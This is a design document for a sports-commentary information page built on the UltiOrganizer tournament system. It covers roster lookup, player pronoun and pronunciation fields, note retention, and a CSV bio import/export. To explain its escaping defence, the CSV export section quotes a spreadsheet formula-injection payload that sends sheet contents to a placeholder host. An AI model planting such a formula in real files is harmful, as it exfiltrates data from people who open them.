# Commentator — a second-screen information surface

**Status:** the page is built. `PLAN.md` owns the scoreboard; `STUDIO.md` owns the stage and what goes on air. This document covers a third consumer: the person **talking** over the broadcast, who needs information rather than graphics.

Sections are marked **built** or **not built** individually, because they landed at different times and the gap between them is where this document earns its keep. Prepared talking points and the bio round trip (§5a) are built; the spotter (§6) and the auto-surfacing behaviour (§7) are not.

**Written:** 2026-08-22

---

## 1. Why this is not part of the Studio

The Studio decides what a viewer sees. The Commentator page decides what a commentator *knows*. Nothing it displays goes to air, and that single fact inverts most of the constraints the rest of this system works under:

| | Studio / overlays | Commentator |
|---|---|---|
| Output reaches viewers | yes | **no** |
| A wrong number is | a false statement on air | something a human discounts out loud, or ignores |
| Incomplete data is | usually unusable (§4) | usable, if labelled |
| Latency budget | ~1s for a click | seconds; nobody is cutting to it |
| Needs the arm/show lifecycle | yes — a half-drawn card is a failure | no |
| Auth | writes gated, overlay open | read-only throughout |
| Density | as sparse as possible | as dense as a person can scan |

**The practical consequence is that this is cheap.** It is a read-only page over an API we already poll, with no broadcast risk, no atomic-write store, no operator contention and no preload discipline. It is the least dangerous thing in the project and probably the highest ratio of usefulness to effort.

It should also be a **separate page on a separate screen**, never a panel inside the Studio: a commentator and an operator are usually two people, and even when they are one person the two jobs want opposite layouts.

## 2. The data situation is much better here than for graphics

Everything the overlays cannot show — blocks, turnovers, possession, clean holds — is about **aggregate statistics** (`STUDIO.md` §3, §4). Play-by-play is a different matter, and it is complete.

Each entry in the `goals` array of the game payload already carries:

| field | |
|---|---|
| `scorerfirstname`, `scorerlastname`, `scorernum` | who scored, with jersey number |
| `assistfirstname`, `assistlastname`, `assistnum` | who assisted |
| `time` | seconds into the game |
| `homescore`, `visitorscore` | running score after this goal |
| `num`, `ishomegoal`, `iscallahan` | sequence, side, callahan flag |

That is a full play-by-play feed, named on both ends of every goal, in a payload the overlays fetch anyway. No new endpoint is needed for the bulk of what a commentator wants.

**And the incompleteness that blocks a graphic does not block a commentator.** A block count that depends on whether that game's scorekeeper recorded Ds (`STUDIO.md` §4) is unusable on a lower-third, because a viewer cannot know it might be short. The same number shown to a commentator, labelled *"3 recorded — may be incomplete"*, is perfectly usable: they are a domain expert who can discount it, and they can simply choose not to say it. **Show it with the caveat rather than withholding it.**

## 3. What professional systems do

General industry shape rather than a specific product — treat this as orientation, not a specification; none of it has been verified against a particular vendor's tool.

Broadcast statistics providers supply commentary teams with a "spotter" or "commentator" feed, and the recurring elements are:

- **Pre-match notes** — head-to-head history, form, seeds, what is at stake.
- **A live event feed** — the play-by-play, in reverse order, scannable at a glance.
- **Player cards on demand** — searchable, with season and match figures side by side.
- **Milestone and streak alerts** — *"two more assists for the tournament lead"*, *"fourth consecutive point won"*.
- **Storyline prompts** — prepared talking points, surfaced when relevant.

The important lesson is what commentators actually use. **They do not read tables on air.** They need *talking points*: a streak, a milestone, a first meeting since a notable game, a run of play. A page that answers "what is interesting right now?" beats one that answers "what are all the numbers?" — and the second is much easier to build by accident.

## 4. What is derivable today, without any upstream change

All of the following come from the goal list, `entity=teams` and `entity=reference`, all already reachable:

**Run of play**
- Scoring runs — *"four of the last five"*, with the names.
- Time since the last goal, and pace against the cap.
- The hold/break sequence, from `classifyPoints()` in `shared/overlay-client.js`.
- Longest run by either side this game.

**People**
- Every player's goals, assists and combined total for this game, from the goal list directly.
- Tournament totals from `entity=teams` → `players[].total`, plus per-game averages.
- Who is connecting with whom — thrower/scorer pairs are named on every goal, so a recurring connection is countable. This is a genuinely good commentary hook and costs nothing.
- Callahans, flagged per goal.

**Teams**
- Record, points for and against, difference, seed — all in `teams.*`.
- Pool standing from `pool_placements` in `entity=reference`.

**Context**
- Field and venue, via `game.reservation` → `reference.reservations[]`.
- Cap state and the current point cap, from the `half_cap` / `time_cap` game events.
- Timeouts remaining per side, with the halftime reset.

**Tournament block totals: built.** `deftotal` on the `entity=teams` roster row, once an administrator turns on `ShowDefenseStats` (`STUDIO.md` §3.1). The roster shows a `Blk` column and offers a Blocks sort — but only where the field is actually present, so an installation that does not track defence sees neither rather than a column of zeros. Completed games only, which the page says out loud. This is exactly the asymmetry §2 predicted: the same number that is too incomplete for a graphic is useful here, because a commentator can qualify it and a lower third cannot.

**Blocked, and honestly so:** anything needing possession or turnovers (`STUDIO.md` §10.4), and tournament-wide block *leaderboards* (`STUDIO.md` §4) — a ranking asserts completeness the data does not have. Per-*game* block counts are a separate gap: they are in no payload, and reaching them through `GameTeamDefenseBoard()` still waits on the direct-database question.

## 5. Referring to people correctly: numbers, pronunciation, pronouns

**Jersey number is the primary index, not player name.** A commentator sees a number on a shirt and needs the name in the time it takes to say it. Every other lookup is secondary. A page whose rosters are sorted by goals — the obvious way to sort a stats table — is the wrong shape for the job it is actually doing.

Three consequences:

- **Sort rosters by number, always**, with statistics as columns rather than as the ordering.
- **Numbers are per team, not unique.** Both sides can field a #7, so a number alone is ambiguous. Both rosters must be visible at once, side by side and separately labelled, and any number-driven search must resolve within a team rather than across the game.
- **The whole roster must be listed, not only the players who have done something.** A commentator needs #14 before #14 has scored.

**The full roster is available.** `TeamScoreBoard()` selects `FROM uo_player` and LEFT JOINs the goal counts with `COALESCE(done, 0)` (`lib/team.functions.php:820-824`), so `entity=teams&id=` returns every player on the team with `num`, and zeros rather than absence for those who have not scored. This was worth checking: had the API returned only scorers, number lookup would have failed for most of the roster and this section would be blocked rather than cheap.

### Pronunciation

**UltiOrganizer has no pronunciation field anywhere.** Neither `uo_player` nor `uo_player_profile` carries a phonetic spelling, and there is nothing comparable in the schema.

This matters more than a missing statistic. Ultimate is international — a WUCC roster mixes Austrian, Finnish, Colombian and Japanese names in a single game — and a commentator mispronouncing a player's name on a public broadcast is a small disrespect to that player, repeated every time they touch the disc. It is also the kind of error the audience notices and the player remembers.

**Built as overlay-local state** — exactly the proving-ground pattern in `STUDIO.md` §2.5, though not as the separate file first sketched here: a structured `pronunciation` field on the desk's notes store (§5a), typed at the desk or arriving through the bio round trip's `Name pronunciation` column, and shown beside the name on the roster and the player sheet rather than buried in a note. Properties that made this the right first home:

- It is prepared *before* a game, not under time pressure, so a plain edit surface is enough.
- It is per-installation and low-stakes — a wrong entry is corrected in seconds.
- Nobody has to build it for it to be useful: a roster that shows a phonetic hint when one exists, and nothing when it does not, is useful from the first entry.

Free-text phonetic spelling (*"KLOH-ster-noy-burk"*) beats IPA, because the reader is a commentator under time pressure, not a linguist.

**It probably belongs upstream eventually.** A name's pronunciation is a property of the person, stable across events and useful to every tournament they attend — so `uo_player_profile` is its natural long-term home. That is precisely the graduation path §2.5 of `STUDIO.md` describes: prove it locally, and propose it upstream if the commentary teams actually maintain it.

### Pronouns

The same class of problem as pronunciation, and arguably a sharper one: how to refer to a person correctly, live, in public, at speed. Ultimate has mixed divisions as a core format and a large number of trans and non-binary players, so a commentator who guesses will get it wrong in front of an audience — repeatedly, since a player is referred to every time they touch the disc.

**Do not infer pronouns from `uo_player_profile.gender`.** That column exists, and using it here would be the single worst mistake this feature could make. It is division-eligibility data — it supports mixed-division ratio rules — and it answers a different question from "how does this person wish to be referred to". Deriving one from the other is precisely the mechanism by which people get misgendered on air, and it would do so automatically and at scale.

So:

- **Self-declared, never inferred.** The only acceptable source is the player, ideally through registration; a broadcast team filling these in by guesswork reproduces the problem it is trying to solve.
- **Free text, not an enumeration.** A short field holding `she/her`, `they/them`, `he/him`, `she/they` or anything else a player writes. A fixed dropdown will be wrong for someone.
- **Optional, and absent means absent.** No default, and no placeholder implying a value. This is the same "absent is not zero" rule as `STUDIO.md` §3.3, applied to a person rather than a statistic — and here the failure mode is worse than a wrong number.
- **When it is absent, use the name.** A commentator can carry a whole game on surname and jersey number without a single pronoun. The page should make that the obvious fallback rather than leaving a blank that invites a guess.

Same store as pronunciation, same graduation path — **also built**, as a structured `pronouns` field on the notes store. The right way to fill it is the bio round trip (§5a), because a player typing their own row *is* the self-declaration this section requires; the desk input exists so a wrong entry is corrected in seconds, not so a desk can guess. It is shown wherever a name is about to be said — the roster, the player sheet, and beside each name on the play-by-play field view — and the rules above are enforced by shape: free text, optional, absent renders nothing. The graduation path is more concrete than it first appeared, because UltiOrganizer already has a player-owned profile with a consent mechanism.

**On the play view, focus follows risk.** Most rosters are overwhelmingly `he/him` and `she/her`; a commentator's reading habit serves those correctly without looking, and the cost of a lapse concentrates on everyone else. The field panel therefore shows every declared set but emphasises the ones that are neither of those two — keyed on the declared string alone, nothing inferred — and carries the rest of the identity line (nickname, how to say the name) as hover text, so the line keeps its number-to-name scannability. This singles people out, deliberately: the page is a private working surface behind the room code, never on air, protected at the same weight as the rest of the notes store (§5a), and getting a person's pronouns right outranks a uniform-looking list.

**Normalising is prep work, done by hand.** The emphasis rule needs the two common sets in a canonical form, but the CSV deliberately stays free text — a dropdown in a team-visible sheet would make the two common answers a form and everything else a disclosure, which is the singling-out that actually matters. The reconciliation happens at the desk instead: each roster panel lists every declared set the rule does not recognise ("He", "she/her/hers", another language, `she/they`, `xe/xem`), each with one-click mapping onto `he/him` or `she/her`, an inline edit for tidying the typing, and **Keep** — which stores the text exactly as it stands, emphasised, and marks it reviewed so the panel never asks about it again. Any set a player declares is displayed verbatim, everywhere, always; mapping exists only for variants that plainly mean a common set, nothing is ever mapped automatically, and when in doubt the answer is Keep. Editing the pronouns afterwards clears the reviewed mark, because a new declaration has not been reviewed.

### What registration already provides

Worth establishing, because it answers "who supplies this" better than any local store can.

| piece | what it is |
|---|---|
| `uo_registerrequest`, `uo_users`, `uo_userproperties` | **account** registration — userid, password, email, token. Not player data |
| `uo_enrolledteam` | **team enrollment** into a series: name, club, series, `userid`, `status`, `enroll_time`. Driven by `user/enrollteam.php`, gated by `seasoninfo.enrollopen` / `enroll_deadline`, both exposed by Live! (`live/api/ReferenceData.php:150`) |
| `user/teamplayers.php` | roster management — a team admin puts players on a roster |
| `user/playerprofile.php` + `uo_player_profile` | **a player-owned profile**: nickname, birthplace, nationality, throwing hand, height, weight, position, story, achievements, image |
| `uo_accreditationlog`, `uo_player.accredited` | accreditation — identity checking at the event, gated by `seasoninfo.require_accreditation` |

Two properties of that profile matter here:

- **Players can edit their own.** `hasEditPlayerProfileRight()` (`lib/user.functions.php:712-726`) grants access to `isPlayerAdmin($profile_id)` — the player themselves — as well as team, series, season and super admins. So there is already a surface where a player supplies their own data rather than having it guessed for them, which is exactly what pronouns require.
- **There is already a per-field consent whitelist.** `uo_player_profile.public` is a pipe-separated list of which fields the player agrees to publish, defaulting to `nickname|birthplace|nationality|throwing_hand|height|weight|position|story|achievements|profile_image`. A new field is not published unless the player adds it.

So the upstream home for both pronunciation and pronouns is `uo_player_profile`, self-edited, and published only through the existing `public` whitelist. The overlay-local store remains the right *first* step — it proves whether commentary teams maintain the data at all — but it is a staging area, not the destination.

### On the privacy burden

An earlier draft of this section argued that a local `conf/` file "carries none of that weight" compared with an upstream field. That overstated it. **UltiOrganizer already stores names, emails, birthdates, nationalities and photographs** — it is thoroughly within GDPR scope already, `docs/privacy.md` exists, and the root `AGENTS.md` already requires new player data to be covered by export, anonymisation and deletion, with tables classified in `docs/ai/privacy-coverage/tables.txt`. Adding a field to a record that already identifies a person is marginal: it joins an existing obligation rather than creating a new category. As soon as you hold a name, the regime applies.

The genuine nuance is narrower, and it is a design consequence rather than a legal claim: pronouns can *reveal* gender identity, which is commonly treated as more sensitive than a name. That argues for publishing strictly through the existing `public` opt-in — never by default — and for the field being deletable independently of the rest of the profile. Both are properties `uo_player_profile` already has, which is another reason it is the right home.

### Related profile data that exists but is not exposed

`uo_player_profile` already carries `nickname`, `position`, `throwing_hand`, `height`, `nationality`, `story` and `achievements` — genuinely good commentary material, and there is a `public` column controlling which of those are publishable. **None of it appears in any Live! entity payload**, so it is not reachable today, and `entity=players&id=<id>` returns `{"error":"Invalid ID"}` even for an id the list endpoint itself returned. That looks like a bug or an undocumented parameter rather than a design decision; it is unexplored and worth settling before assuming this data is unavailable.

### Commentary material: what a player would say about themselves, if asked

§3's lesson is that commentators do not read tables on air. Everything else in this document produces *numbers* — who scored, how often, what the run of play is — and none of it answers the question a commentator reaches for when the disc is not in the air, which is **who is this person**.

`uo_player_profile` is closer to that than any statistic, and `story` and `achievements` are free text, so in principle a player can already write anything there. **Free text is the wrong shape for this job, and that is the actual gap rather than the absence of a field.** A commentator has a few seconds between points; a paragraph has to be read, held in mind and paraphrased before any of it can be said. A short labelled line can be lifted straight into speech. So the ask is a small number of **short, structured, self-declared** fields beside the ones that exist:

| field | why a commentator wants it |
|---|---|
| other sports played, past or present | the most reliable source of a line there is — a background in athletics, handball or basketball explains something visible on the field, and cross-sport athletes are common in ultimate |
| how they came to ultimate | universally interesting and never guessable: a university team, a sibling, a game on a beach |
| occupation or field of study | places the person outside the sport, which is what an audience remembers a week later |
| hobbies and interests | the light material every broadcast needs during a stoppage |
| years playing, and clubs played for before | the closest thing to a career record this system can have without federation (§8a) |

Each is one line, and each is optional.

**Same home, same edit surface, same consent mechanism as pronunciation and pronouns:** `uo_player_profile`, self-edited through `user/playerprofile.php`, published only if the player adds the field to the `public` whitelist. That is what makes this a cheap ask rather than a large one — the storage, the player-owned edit page, the per-field opt-in and the privacy obligations all exist, and these fields join them rather than creating anything new.

**But unlike pronunciation, a desk cannot author this.** A broadcast team can research a phonetic spelling and type it in; nobody can supply a player's hobbies on their behalf. The one overlay-local route is therefore the bio round trip (§5a), where each player writes their own row — and that is a bridge with a room's lifetime, gathered again for every tournament, not a home. The durable version is upstream or it does not exist.

Three things to get right, each of them a rule already stated elsewhere in these documents:

- **Absent is the normal case, not an exception.** On any real roster most of these fields will be empty and many always will be. Show what exists and nothing where it does not — no placeholder, no prompt implying the player was asked and declined. Same rule as `STUDIO.md` §3.3, for the same reason: an empty field is not a fact about the player.
- **Never inferred, never filled in by somebody else.** Player-authored or nothing, exactly as for pronouns above. The stakes are lower than they are for pronouns, but the failure is the same one: a guess said on air is heard as the player's own words.
- **This is the first data on the page with no verification path at all.** A statistic can be incomplete and can be labelled as such (§2); a biography can simply be out of date — a job left two years ago, a club no longer played for — and nothing in the system will ever notice. So carry when the profile was last edited, and present these as the player's words rather than as facts the tournament is asserting. A commentator who knows the provenance says "he told us" instead of "he is".

**And none of it is reachable today, including the fields that already exist** — the subsection above applies unchanged. Exposing `uo_player_profile` through a Live! payload at all is a prerequisite for any of this, and it is the cheaper half of the work.

## 5a. Prepared talking points, typed by the commentator — **built**

Everything in the subsection above is an upstream ask, which means it is worth nothing this season. This is the part that could be built without waiting for anybody, and it is the lowest-hanging thing on the page.

**The case is specific rather than general.** At a large tournament the commentary position is staffed all week and material can be prepared properly. At a smaller one there are commentators for the finals and nobody before that, and the way material actually reaches them is that somebody asks the two teams for something to say and is handed it an hour before the pull — by email, in a message, or verbally. There is no UltiOrganizer surface for that, and there will not be one before the game starts. So the commentator types it in here.

That does not make §5's ask redundant. A self-declared profile field is still the right destination: it is authored by the person it describes, it follows them between tournaments, and it carries consent. This is what a desk does in the absence of one, and it should be read as scaffolding rather than as the answer.

### Where it lives

A free-text box per player, in the **player detail overlay** — the same dialog the roster already opens — with the roster marking which players have one.

Both halves of that matter. The overlay is where a note has room to be read and edited, and where it is already in the context of that player's numbers. But a note in a dialog is invisible from the outside, and a commentator is not going to open twenty-eight players one at a time to discover which three have anything written about them. So the list carries a marker: **presence only, never a preview**. The roster's job is to be scanned by jersey number (§5) and a column of text excerpts would destroy that.

The marker is a dot, and three things about it were settled by measurement rather than taste:

- **It is drawn in `--link`, not `--accent`.** Accent is a *fill* colour — the background of a pressed button, with white text on it — so against the panel behind the dot it measured **2.59:1** in the night theme. That is below even the 3:1 floor for a meaningful graphic, for the only visual signal that a player has a note. `--link` is the token that is legible against the page in both themes: 8.4:1 in day, 10.4:1 in night.
- **Colour and shape carry none of it.** The dot is `aria-hidden`; the button also says "has talking points" in visually-hidden text and in its `title`. Same rule as the hold/break blocks on the scoreboard (`PLAN.md` §4) — colour reinforces, words mean.
- **Markers update in place, never by re-rendering the roster.** A 28-player squad scrolls inside its panel, and the moment a marker changes is exactly the moment somebody has finished writing a note and is looking at the row they wrote it for. Rebuilding the table to add one dot would throw them back to the top of the list.

### The room is the code alone, and that is the whole design

`Lines` keys a room by **game plus code**. This store keys by **code alone**, and the difference is the point rather than an inconsistency.

A line selection is worthless five minutes after the point ends. A note about a player is worth exactly as much in the final as it was in the quarter. Keying notes by game would make a desk retype everything each round, which is the surest way to have them stop doing it by lunchtime. So the room is the code, and a desk that keeps its code keeps its notes for the tournament.

**Codes are still generated per game, and carrying notes between games is a deliberate act rather than an automatic one.** A revision of this feature made a game with no stored code inherit the last code the browser used, so that notes would follow a desk from round to round. That was withdrawn, and the reason is worth keeping because it is not about notes at all.

**The sync code is not only a namespace — it is also the possession-write credential.** The Studio operator nominates a code per game, and the desk holding it may declare possession, which feeds break chance, clean holds and the turnover count on the scoreboard bug (§6, `STUDIO.md` §10.4). Possession reaches air. So making the code sticky across fixtures would have taken a convenience for a private reference panel and quietly widened what can change a broadcast: a desk nominated on one game would arrive at the next already holding the code. Two very different consequences ride one value, and the gate has to match the larger of them.

The general lesson, which applies to anything else added to this page: **before making a value more persistent, check everything that value authorises.** The reasoning for the change was entirely about notes and entirely correct about notes, and it was still wrong.

So a desk that wants its notes in the next round types the code it used before. That is the same gesture as sharing the code with a partner, it cannot happen by accident, and the roster shows immediately whether the notes came with it — no dots means the wrong room.

It also removes the trap `Lines::prune()` fell into. There, rooms have to be bounded per game *and* overall, because bounding per game alone bounds nothing — any positive integer is an acceptable game id, so a caller walking `game=1, 2, 3 …` collects a fresh allowance every time (§6). With no game in the key there is one flat directory and one bound that actually holds.

### Saving

**On a pause in typing, and again on blur and on close — never on a button.** There is no good failure mode for a Save button here: a commentator who has typed a paragraph and closes the dialog has lost it, and will not find out until the moment they wanted it. The box says `Unsaved` / `Saving…` / `Saved` so the state is never a guess, and a failed write says *"Not shared — kept on this screen"* rather than pretending, because the local text is still there and still usable.

An empty box **deletes** rather than storing a blank. A blank entry would still count against the room's cap and still hold its own expiry clock.

### This is the one store holding one person's words about another

Every other store here holds facts about a game. This holds what a commentator wrote about a named player, and that difference is load-bearing rather than decorative:

- **It has no verification path at all.** A statistic can be incomplete and labelled so (§2). A note can simply be wrong, or out of date, and nothing in the system will ever notice. So every note carries **who wrote it and when** — a commentator about to repeat something on air should be able to tell their partner's note from their own, and a note from last week from one written this morning.
- **It is third-party authored, which is the opposite of the rule §5 sets for pronouns and pronunciation.** That rule is not violated so much as out of scope: this is a commentator's own preparation notebook, not a claim about what the player says of themselves. It is worth being explicit that the two must not be conflated if these ever end up displayed together.
- **It is personal data, so the boundaries are real.** `conf/` is default-closed in the overlays' `.htaccess`, so a note room is not a servable file — asserted by a test, not assumed. The directory is gitignored. And notes expire; see below.
- **The code is still a namespace, not a credential.** Everything §6 says about that applies here, with one difference worth stating plainly: a guessed line room exposes who somebody thinks is on the field, and a guessed note room exposes what a commentary desk wrote about named players. That is a larger consequence from the same mechanism. It stays unauthenticated for the reason §6 gives — a tournament often has no admin at the field, and gating this behind broadcast control would be a much worse trade — but it is the reason the store expires, the reason the files are not servable, and the reason the code is no longer on permanent display.

### The code is masked, on both surfaces

**A namespace nobody can guess is exactly what these guarantees rest on — and a code printed on screen all day is not unguessable, it is published.** Both the commentary booth and the operator's station are among the most-walked-past screens at a tournament, and five characters are memorable at a glance. Saying "it is a namespace, not a credential" describes what the code *is not*; it does not excuse handing it to anyone who walks past.

So `shared/secret.js` masks both fields by default, with a Show button that reveals and **re-masks itself after thirty seconds**. The auto-hide is the part that does the work: "reveal, read it out, forget to hide it again" is the real failure mode, and a manual toggle alone would spend a tournament in the revealed state.

Three details, the last of which corrects an earlier draft of this section:

- **On the Studio the stakes are higher, not lower.** That code authorises writing possession, which reaches air — so it is masked there too, and the change confirmation no longer echoes it back: the operator just typed it, so repeating it tells them nothing and only puts it on screen twice.
- **Masking is testable without a password**, because the field renders for an anonymous visitor too — disabled, and with nothing behind the mask, since the nominated code is never published. The test therefore lives outside the logged-in block: a test that only runs when `ADMIN_PASS` happens to be set is a test that mostly does not run.
- **Generating a new code does *not* reveal the field**, and the argument that said it should was circular. It ran: an operator who has to press Show after generating will leave it revealed — but the auto-hide means the field *cannot* be left revealed, which is the whole point of having one. Once the auto-hide exists, "reveal it for them" is only ever a convenience, never a safeguard, and here it was not even that: the confirmation message already carries the code for six seconds and then clears itself. Revealing the field as well was a second copy of the same secret, on screen for five times as long. **The general form is worth keeping: once a control makes a bad state unreachable, any argument of the shape "otherwise users will end up in that state" is no longer available.**

### Retention: notes are gathered for one broadcast and then deleted

**A note lasts seven days from its last edit, and the sweep runs on read as well as on write.**

Both halves were needed. The first implementation expired rooms after fourteen days but pruned only when something was written — which meant a tournament that finished and was never written to again kept its notes forever, exactly the case a retention limit exists for. Now any read of any room clears everything past the limit, so the next desk to open the page is what cleans up after the last one. There is no cron, nothing to install, and nothing that depends on a tournament remembering to tidy up.

The details that matter:

- **Reading does not extend a note's life.** Expiry is measured from the last write. A desk leaving the page open must not keep somebody's personal data alive indefinitely, and an expiry any passer-by can renew is not an expiry.
- **Seven days, from the last edit.** Long enough to cover preparation in the days before an event plus the event itself; short enough that a tournament's notes are gone the following week.
- **The sweep is throttled to once an hour on read, and is unconditional on write.** That looks inconsistent and is not. On read, pruning enforces *retention*, and once an hour is ample for a seven-day window against a page that polls every fifteen seconds. On write it also enforces the room-count *bound*, and a bound that only applies once an hour is not a bound — an unauthenticated caller would create rooms inside the gap.
- **If the throttle stamp cannot be written, it degrades to pruning on every read** rather than to never pruning. The expensive failure is cheap; the cheap failure would be keeping personal data past its limit.
- **The box says so.** A note that has not been written yet shows *"Shared with anyone holding the room code. Deleted 7 days after the last edit."* An expiry nobody was told about is indistinguishable from losing data.

### The bio round trip: export, the team fills it in, import — **built**

Typing notes at the desk is the fallback, not the goal. The material already exists before the commentator ever sees it: somebody asked the two teams for something to say, and a team sent back a document. Retyping that into twenty-eight boxes is work nobody does twice.

```
export CSV (identifier + name, empty prompt columns)
  -> the team puts it in a shared sheet
  -> each player fills in their own row
  -> export CSV
  -> import here
```

**A shared document the players fill in themselves is a better shape than a commentator's notebook in every way that matters**, and it is the principle §5 argues for the upstream profile fields, reached without waiting for a schema change:

- **The player writes their own entry**, so it is self-declared rather than second-hand — which answers the sharpest objection to this whole feature, that it is one person's unverifiable words about another.
- **It gives players agency at the point where agency means something.** A player can add, edit or remove their own line while the document is still open, before the game. A note typed at the desk gives them no such moment.
- **It is reusable.** The same document serves every tournament the team attends, and it is the team's to keep.
- **The team owns the boundary.** Whatever is in that document, the team chose to send it.

It does not replace the box. A commentator's own observations — something a coach mentioned, something from the previous game — have no other home, so **import fills only what is empty and never overwrites what was typed**, and the preview says how many rows were kept for that reason. The rule holds per channel — the note and each structured field independently — so a player whose note was typed at the desk still receives the pronouns nobody had. It is enforced in the store rather than only in the page, so a partner writing during a preview cannot be overwritten by an import that never saw their note.

#### The identifier is never trusted

The CSV spends its life in a document an entire team can edit. Anyone with the link can change an identifier, or add a row carrying somebody else's. Used blindly, that is a way to write arbitrary text against a named player **on the opposing team** — text a commentator then reads out on air, in good faith, believing it came from that player.

So the identifier is only ever a lookup key inside one team's roster, never an instruction about who to write to:

1. **An import is scoped to one team**, chosen by the commentator. The candidate set is that team's roster and nothing else, so no row can reach a player on the other team however its identifier was edited.
2. **The exported name travels with the identifier and is checked on the way back.** If they disagree the row is rejected and both names are shown. That catches the within-team version of the same trick, where somebody retargets a teammate's row.
3. **Nothing is applied until the reader has seen the tally.** *"2 to import · 2 not imported"*, with every refusal listed by row number and reason.

Name comparison is strict about letters and loose about accents, case, punctuation and spacing. Rejecting `Álex Auer` against `Alex Auer` would block honest rows, and a check people learn to work around protects nothing.

Every rejection is reported rather than dropped. A silent import is how the wrong biography ends up on the desk in front of somebody about to say it.

#### Why a CSV, and why the browser parses it

**Take a file; do not fetch a URL.** The obvious design is a link to the team's document that the server retrieves:

| | server fetches a URL | CSV, exported by the team |
|---|---|---|
| Works on a tournament LAN with no internet | **no** — and that is the normal case in these documents | yes |
| Private document | needs OAuth, an API key, or a document made public to the world | already authenticated: whoever exported it could open it |
| New outbound dependency from PHP | yes, with the timeouts, retries and SSRF surface that implies | none |
| Google-specific | yes, in practice | no — Sheets, Excel, Numbers and every registration system export CSV |

A CSV is also the format the source is *already* in: a team collecting player answers is collecting them in a spreadsheet, one row per player, with the jersey number already a column.

**`FileReader` reads it locally and the page posts the result through the endpoint that already exists.** No upload handling, no temp files, no new server surface, and it works with the network down.

**The Google-workflow question, decided.** Since the destination is usually a Google Sheet anyway, three integrations were considered. A **Copy for Sheets** button is built: the same table onto the clipboard as TSV, a fresh `sheets.new` tab, paste — no download step, no OAuth, no dependency, and it degrades to nothing offline. A full Drive/OAuth integration ("create the sheet for me") was declined: it would demand a Google Cloud project, client id and consent-screen process from **every installation**, plus a third-party script on an operator page that has no external dependencies — setup friction this project avoids everywhere else. And import-by-URL from a shared sheet was declined on privacy rather than technics: it only works on a document set to "anyone with the link", and this document carries player personal data including pronouns. A workflow that nudges every team toward making that link-public points the opposite way from everything else in this store; the private download costs two clicks and keeps the document private.

**The export marks formula-looking cells as text.** This is CSV injection, and it applies here because the export carries **player names out of the database** into a file the team opens in Sheets or Excel. A player named `=HYPERLINK("http://x/?"&A1,"hi")` is a formula that runs when the team opens the sheet, and in Sheets that is enough to exfiltrate the rest of the document. Quoting does *not* prevent it — both applications evaluate a formula inside a quoted field — so any cell beginning `=`, `+`, `-`, `@`, tab or CR is prefixed with an apostrophe, the spreadsheet's own "this is text" marker. Ordinary names and numbers are untouched, and a neutralised name still matches its roster entry on the way back, because the name comparison ignores punctuation.

**`shared/csv.js` is a real parser, not `split(',')`**, and it is tested directly rather than through the page. Quoted fields containing commas and newlines are normal in exactly this content — *"Handball, then ultimate at university"* is one field — and splitting on commas truncates the note and shifts every later column, silently, on a file that looks fine in a spreadsheet. It also sniffs the delimiter outside quotes (a European Excel writes semicolons, and the commas inside a quoted answer outnumber them), strips the UTF-8 BOM Excel writes, and accepts all three line endings.

#### What the export contains

`Player ID`, `Number`, `Name`, then `Team` and `Team ID` — the sheet is team-specific and gets forwarded around, so every row (and the file name) says whose it is: the name is the players' own check that they were sent the right sheet, the id is the import's. A file whose rows all claim another team is refused as a *file*, naming the team it belongs to and, when that is the opposing side, pointing at their Import button — one clear message instead of twenty-eight per-row rejections. Deleting the columns disables only this check; the per-row roster guard stands. Then four structured columns — `Nickname`, `Pronouns`, `Name pronunciation`, and `Matching (FMP/MMP)` — which import into their own fields and are shown beside the name rather than composed into the note (§5). Matching is the odd one out: a competition designation rather than identity, accepted only as the sport's own two terms — a cell that cannot say FMP or MMP imports as blank, never as a guess, and a gender letter is exactly the category error `STUDIO.md` §10.5 exists to prevent — and displayed only in a mixed division, on the roster and the line picker, where clicking a legal line together is the moment it is needed. Then five empty prompt columns, the fields §5 asks upstream for, phrased as questions. A blank column gets a blank answer; a column that asks something gets an answer. A team may delete or add columns freely: the import maps by header, several filled prompt columns compose into one labelled note, and a single filled one is not labelled with its own question.

The sheet ends with a **TEAM row** — identifier `TEAM`, the team name in the name column — whose own prompt columns (`Team history`, `Team achievements`) hold the material that belongs to nobody's row. It imports as the team's note under exactly the player-row rules: the exported name travels with it and is checked back, a second TEAM row does not silently win, and it fills the desk's **About the team** box only where nothing was typed. That box sits on each roster panel and is the desk's own edit path for the same note.

An untouched export imports nothing rather than blanking the roster.

#### One request, not twenty-eight

The import writes through a batch call rather than a loop of single saves. Twenty-eight separate requests means twenty-eight lock/read/write cycles, each a chance for a partner's edit to interleave, and a failure halfway through leaves an import half-applied with no way to say which half. One request, one lock, one file write — the only shape in which "apply this import" is a single decision.

**This is also where a real bug surfaced.** `save()` used to refuse any write landing within 0.2s of the last and report success, on the reasoning that the next poll carries the same state. It does not: the state was never stored, so the next poll *reverts* the edit and the caller was told it saved. `filemtime()` has one-second granularity, so the real window was unpredictable up to a second rather than the 0.2s it appeared to be. It now skips a write that would **change nothing** instead of one that arrives too soon — which drops exactly the writes worth dropping (a debounced save firing twice with the same text) and never loses one that would have changed anything.
### Caps

The second unauthenticated write in the project, so the same discipline as `lines.php`: **bound what the attacker controls, not what a caller is expected to send.** 1000 characters per note, 100 players per room (which fixes the document's ceiling at ~100 KB), 200 rooms in the directory, the expiry above, and a minimum interval between writes. The players-per-room cap is the one that matters and the one the equivalent in `lines.php` originally got wrong: `save()` merges one player into whatever the room already holds, so a per-note length cap on its own would let a room grow one request at a time forever.

Read-modify-write goes through `flock` on a shared lock file, as `colors.php` and `possession.php` do. The temp-file-and-rename underneath gives *readers* atomicity and excludes no writer at all — each one holds `LOCK_EX` on its own private temp file.

## 6. Who is on the field

A commentator needs to know which seven are playing this point. Nothing in UltiOrganizer records it (`STUDIO.md` §10.2), so it has to be entered — and entering it is only realistic if it is fast and if two people can share the work.

### This is the first genuinely shared state in the system

Everything else here is read-only, and even the Studio's show state has one writer. A line selection has **several people writing at once**, which is a different problem and the main thing to design for.

The workflow makes it tractable. A commentary duo naturally splits — one per team, or one per side of the field — so **the state is stored per team and writes are scoped to one team**:

```json
{ "702": { "300": [3, 7, 12, 18, 22, 24, 31],
           "301": [1, 4, 9, 11, 15, 20, 27] } }
```

Two commentators who have divided the teams then touch disjoint data and cannot conflict at all. That is worth more than any locking scheme, and it falls out of how they were going to work anyway.

Where they *do* overlap — both editing one team — take last-write-wins and show it: a brief "changed by someone else" note beats a rejected write, because a commentator cannot stop to resolve a conflict mid-point. This is the opposite call from the Studio's `rev` check (`STUDIO.md` §2.4), and deliberately so: there, a silent overwrite changes what is on air; here it changes a private reference panel.

